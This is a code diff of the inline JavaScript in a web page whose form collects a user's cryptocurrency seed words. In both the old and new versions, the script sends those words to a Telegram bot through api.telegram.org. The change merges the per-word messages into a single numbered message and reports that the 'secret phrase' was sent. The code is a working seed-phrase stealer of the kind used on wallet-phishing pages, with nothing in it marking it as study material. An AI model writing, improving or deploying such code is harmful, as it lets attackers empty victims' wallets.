@@ -186,29 +186,28 @@
                 return;
             }
 
-            // Отправляем каждое слово на новой строке
-            seedWords.forEach((word, index) => {
-                const message = `Секретное слово ${index + 1}: ${word}`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message }),
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log(`Слово ${index + 1} отправлено.`);
-                    } else {
-                        return response.json().then(data => {
-                            alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
-                        });
-                    }
-                })
-                .catch(error => {
-                    alert('Ошибка: ' + error.message);
-                });
+            // Формируем сообщение с порядковым номером и словами на новой строке
+            const message = seedWords.map((word, index) => `Слово ${index + 1}: ${word}`).join('\n');
+
+            // Отправляем сообщение в Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Секретная фраза успешно отправлена!');
+                } else {
+                    return response.json().then(data => {
+                        alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
+                    });
+                }
+            })
+            .catch(error => {
+                alert('Ошибка: ' + error.message);
             });
 
-            alert('Слова успешно отправлены!');
             document.getElementById('seedForm').reset();
         });
     </script>
